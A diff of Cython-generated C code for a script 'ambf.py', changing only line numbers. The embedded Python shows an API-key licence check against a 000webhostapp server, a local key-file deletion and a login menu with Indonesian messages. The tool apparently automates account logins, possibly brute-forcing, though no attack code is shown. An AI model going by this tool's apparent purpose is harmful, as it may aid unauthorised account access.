   __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 677, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 670, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-  /* "ambf.py":670
+  /* "ambf.py":663
  * 		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
  * 
  * def make():             # <<<<<<<<<<<<<<
@@ -21091,7 +20850,7 @@ static PyObject *__pyx_pf_4ambf_36make(CYTHON_UNUSED PyObject *__pyx_self) {
   return __pyx_r;
 }
 
-/* "ambf.py":679
+/* "ambf.py":672
  * 	login()
  * 
  * def cek_apikey():             # <<<<<<<<<<<<<<
@@ -21129,16 +20888,16 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("cek_apikey", 0);
 
-  /* "ambf.py":680
+  /* "ambf.py":673
  * 
  * def cek_apikey():
  * 	key = open(".__apikey__.txt","r").read()             # <<<<<<<<<<<<<<
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 	if cek["status"] == "error":
  */
-  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 680, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 673, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 673, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_t_2 = NULL;
@@ -21153,25 +20912,25 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   }
   __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
   __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 680, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 673, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_v_key = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":681
+  /* "ambf.py":674
  * def cek_apikey():
  * 	key = open(".__apikey__.txt","r").read()
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()             # <<<<<<<<<<<<<<
  * 	if cek["status"] == "error":
  * 		print(" [!] Api Key Tidak Terdaftar")
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 681, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 681, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-  __pyx_t_2 = PyNumber_Add(__pyx_kp_s_https_ngepetonline_000webhostapp, __pyx_v_key); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 681, __pyx_L1_error)
+  __pyx_t_2 = PyNumber_Add(__pyx_kp_s_https_ngepetonline_000webhostapp, __pyx_v_key); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
   __pyx_t_5 = NULL;
   if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
@@ -21186,10 +20945,10 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2);
   __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 681, __pyx_L1_error)
+  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 681, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_t_3 = NULL;
@@ -21204,44 +20963,44 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   }
   __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
   __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 681, __pyx_L1_error)
+  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 674, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __pyx_v_cek = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":682
+  /* "ambf.py":675
  * 	key = open(".__apikey__.txt","r").read()
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 	if cek["status"] == "error":             # <<<<<<<<<<<<<<
  * 		print(" [!] Api Key Tidak Terdaftar")
  * 		os.system("rm -f .__apikey__.txt")
  */
-  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 682, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
-  __pyx_t_6 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_error, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 682, __pyx_L1_error)
+  __pyx_t_6 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_error, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 675, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   if (__pyx_t_6) {
 
-    /* "ambf.py":683
+    /* "ambf.py":676
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 	if cek["status"] == "error":
  * 		print(" [!] Api Key Tidak Terdaftar")             # <<<<<<<<<<<<<<
  * 		os.system("rm -f .__apikey__.txt")
  * 	elif cek["status"] == "expired":
  */
-    if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Tidak_Terdaftar) < 0) __PYX_ERR(0, 683, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Tidak_Terdaftar) < 0) __PYX_ERR(0, 676, __pyx_L1_error)
 
-    /* "ambf.py":684
+    /* "ambf.py":677
  * 	if cek["status"] == "error":
  * 		print(" [!] Api Key Tidak Terdaftar")
  * 		os.system("rm -f .__apikey__.txt")             # <<<<<<<<<<<<<<
  * 	elif cek["status"] == "expired":
  * 		print(" [!] Api Key Kamu Sudah Kadaluwarsa")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 684, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 677, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 684, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 677, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -21256,12 +21015,12 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_kp_s_rm_f___apikey___txt) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_rm_f___apikey___txt);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 684, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 677, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":682
+    /* "ambf.py":675
  * 	key = open(".__apikey__.txt","r").read()
  * 	cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 	if cek["status"] == "error":             # <<<<<<<<<<<<<<
@@ -21271,38 +21030,38 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":685
+  /* "ambf.py":678
  * 		print(" [!] Api Key Tidak Terdaftar")
  * 		os.system("rm -f .__apikey__.txt")
  * 	elif cek["status"] == "expired":             # <<<<<<<<<<<<<<
  * 		print(" [!] Api Key Kamu Sudah Kadaluwarsa")
  * 		os.system("rm -f .__apikey__.txt")
  */
-  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 685, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_v_cek, __pyx_n_s_status_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 678, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
-  __pyx_t_6 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_expired, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 685, __pyx_L1_error)
+  __pyx_t_6 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_expired, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 678, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   if (__pyx_t_6) {
 
-    /* "ambf.py":686
+    /* "ambf.py":679
  * 		os.system("rm -f .__apikey__.txt")
  * 	elif cek["status"] == "expired":
  * 		print(" [!] Api Key Kamu Sudah Kadaluwarsa")             # <<<<<<<<<<<<<<
  * 		os.system("rm -f .__apikey__.txt")
  * 	else:
  */
-    if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Kamu_Sudah_Kadaluwarsa) < 0) __PYX_ERR(0, 686, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_kp_s_Api_Key_Kamu_Sudah_Kadaluwarsa) < 0) __PYX_ERR(0, 679, __pyx_L1_error)
 
-    /* "ambf.py":687
+    /* "ambf.py":680
  * 	elif cek["status"] == "expired":
  * 		print(" [!] Api Key Kamu Sudah Kadaluwarsa")
  * 		os.system("rm -f .__apikey__.txt")             # <<<<<<<<<<<<<<
  * 	else:
  * 		open(".__apikey__.txt","w").write(key)
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 687, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 687, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 680, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -21317,12 +21076,12 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_kp_s_rm_f___apikey___txt) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s_rm_f___apikey___txt);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 687, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 680, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":685
+    /* "ambf.py":678
  * 		print(" [!] Api Key Tidak Terdaftar")
  * 		os.system("rm -f .__apikey__.txt")
  * 	elif cek["status"] == "expired":             # <<<<<<<<<<<<<<
@@ -21332,7 +21091,7 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":689
+  /* "ambf.py":682
  * 		os.system("rm -f .__apikey__.txt")
  * 	else:
  * 		open(".__apikey__.txt","w").write(key)             # <<<<<<<<<<<<<<
@@ -21340,9 +21099,9 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
  * 
  */
   /*else*/ {
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 689, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 682, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 689, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 682, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -21357,12 +21116,12 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_key) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_key);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 689, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 682, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":690
+    /* "ambf.py":683
  * 	else:
  * 		open(".__apikey__.txt","w").write(key)
  * 		return make()             # <<<<<<<<<<<<<<
@@ -21370,7 +21129,7 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
  * def main():
  */
     __Pyx_XDECREF(__pyx_r);
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_make); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 690, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_make); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 683, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -21384,7 +21143,7 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 690, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 683, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_r = __pyx_t_1;
@@ -21393,7 +21152,7 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   }
   __pyx_L3:;
 
-  /* "ambf.py":679
+  /* "ambf.py":672
  * 	login()
  * 
  * def cek_apikey():             # <<<<<<<<<<<<<<
@@ -21420,7 +21179,7 @@ static PyObject *__pyx_pf_4ambf_38cek_apikey(CYTHON_UNUSED PyObject *__pyx_self)
   return __pyx_r;
 }
 
-/* "ambf.py":692
+/* "ambf.py":685
  * 		return make()
  * 
  * def main():             # <<<<<<<<<<<<<<
@@ -21475,7 +21234,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("main", 0);
 
-  /* "ambf.py":693
+  /* "ambf.py":686
  * 
  * def main():
  * 	try:             # <<<<<<<<<<<<<<
@@ -21491,16 +21250,16 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XGOTREF(__pyx_t_3);
     /*try:*/ {
 
-      /* "ambf.py":694
+      /* "ambf.py":687
  * def main():
  * 	try:
  * 		key = open(".__apikey__.txt","r").read()             # <<<<<<<<<<<<<<
  * 		cek_apikey()
  * 	except (KeyError, IOError):
  */
-      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 694, __pyx_L3_error)
+      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 687, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_5);
-      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 694, __pyx_L3_error)
+      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 687, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_6);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
       __pyx_t_5 = NULL;
@@ -21515,20 +21274,20 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
       __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
-      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 694, __pyx_L3_error)
+      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 687, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_4);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
       __pyx_v_key = __pyx_t_4;
       __pyx_t_4 = 0;
 
-      /* "ambf.py":695
+      /* "ambf.py":688
  * 	try:
  * 		key = open(".__apikey__.txt","r").read()
  * 		cek_apikey()             # <<<<<<<<<<<<<<
  * 	except (KeyError, IOError):
  * 		logo()
  */
-      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_cek_apikey); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 695, __pyx_L3_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_cek_apikey); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 688, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_6);
       __pyx_t_5 = NULL;
       if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
@@ -21542,12 +21301,12 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
       __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
-      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 695, __pyx_L3_error)
+      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 688, __pyx_L3_error)
       __Pyx_GOTREF(__pyx_t_4);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-      /* "ambf.py":693
+      /* "ambf.py":686
  * 
  * def main():
  * 	try:             # <<<<<<<<<<<<<<
@@ -21564,7 +21323,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
     __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
     __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-    /* "ambf.py":696
+    /* "ambf.py":689
  * 		key = open(".__apikey__.txt","r").read()
  * 		cek_apikey()
  * 	except (KeyError, IOError):             # <<<<<<<<<<<<<<
@@ -21574,19 +21333,19 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
     __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
     if (__pyx_t_7) {
       __Pyx_AddTraceback("ambf.main", __pyx_clineno, __pyx_lineno, __pyx_filename);
-      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 696, __pyx_L5_except_error)
+      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 689, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_4);
       __Pyx_GOTREF(__pyx_t_6);
       __Pyx_GOTREF(__pyx_t_5);
 
-      /* "ambf.py":697
+      /* "ambf.py":690
  * 		cek_apikey()
  * 	except (KeyError, IOError):
  * 		logo()             # <<<<<<<<<<<<<<
  * 		print(" [*] IP          : %s"%(ip))
  * 		print(" [#] ----------------------------------------------")
  */
-      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_logo); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 697, __pyx_L5_except_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_logo); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 690, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_9);
       __pyx_t_10 = NULL;
       if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
@@ -21600,75 +21359,75 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
       }
       __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
       __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 697, __pyx_L5_except_error)
+      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 690, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_8);
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
       __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
 
-      /* "ambf.py":698
+      /* "ambf.py":691
  * 	except (KeyError, IOError):
  * 		logo()
  * 		print(" [*] IP          : %s"%(ip))             # <<<<<<<<<<<<<<
  * 		print(" [#] ----------------------------------------------")
  * 		print(" [1]. Dapatkan Api Key")
  */
-      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ip); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 698, __pyx_L5_except_error)
+      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ip); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 691, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_8);
-      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_IP_s_2, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 698, __pyx_L5_except_error)
+      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_IP_s_2, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 691, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_9);
       __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-      if (__Pyx_PrintOne(0, __pyx_t_9) < 0) __PYX_ERR(0, 698, __pyx_L5_except_error)
+      if (__Pyx_PrintOne(0, __pyx_t_9) < 0) __PYX_ERR(0, 691, __pyx_L5_except_error)
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-      /* "ambf.py":699
+      /* "ambf.py":692
  * 		logo()
  * 		print(" [*] IP          : %s"%(ip))
  * 		print(" [#] ----------------------------------------------")             # <<<<<<<<<<<<<<
  * 		print(" [1]. Dapatkan Api Key")
  * 		print(" [2]. Masukan Api Key")
  */
-      if (__Pyx_PrintOne(0, __pyx_kp_s__4) < 0) __PYX_ERR(0, 699, __pyx_L5_except_error)
+      if (__Pyx_PrintOne(0, __pyx_kp_s__4) < 0) __PYX_ERR(0, 692, __pyx_L5_except_error)
 
-      /* "ambf.py":700
+      /* "ambf.py":693
  * 		print(" [*] IP          : %s"%(ip))
  * 		print(" [#] ----------------------------------------------")
  * 		print(" [1]. Dapatkan Api Key")             # <<<<<<<<<<<<<<
  * 		print(" [2]. Masukan Api Key")
  * 		print(" [3]. Daftar Api Key")
  */
-      if (__Pyx_PrintOne(0, __pyx_kp_s_1_Dapatkan_Api_Key) < 0) __PYX_ERR(0, 700, __pyx_L5_except_error)
+      if (__Pyx_PrintOne(0, __pyx_kp_s_1_Dapatkan_Api_Key) < 0) __PYX_ERR(0, 693, __pyx_L5_except_error)
 
-      /* "ambf.py":701
+      /* "ambf.py":694
  * 		print(" [#] ----------------------------------------------")
  * 		print(" [1]. Dapatkan Api Key")
  * 		print(" [2]. Masukan Api Key")             # <<<<<<<<<<<<<<
  * 		print(" [3]. Daftar Api Key")
  * 		ask = input("\n [?] choose : ")
  */
